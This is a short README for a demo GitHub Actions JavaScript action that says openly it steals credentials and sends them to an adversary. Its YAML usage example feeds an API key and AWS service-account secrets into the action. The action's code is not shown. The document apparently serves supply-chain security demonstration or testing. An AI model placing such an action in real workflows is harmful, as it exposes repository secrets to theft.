# Demo Cred Exfil javascript action

This action steals credentials and exfils to adversary.

## Inputs

### `API-KEY`
### `AWS_SERVICE_ACCOUNT_CREDS`

## Example usage

```yaml
uses: actions/exfil-javascript-action@e76147da8e5c81eaf017dede5645551d4b94427b
with:
  API-KEY: ${{ secrets.API_KEY }}
  AWS_SERVICE_ACCOUNT_CREDS: ${{ secrets.AWS_SERVICE_ACCOUNT_CREDS }}
```
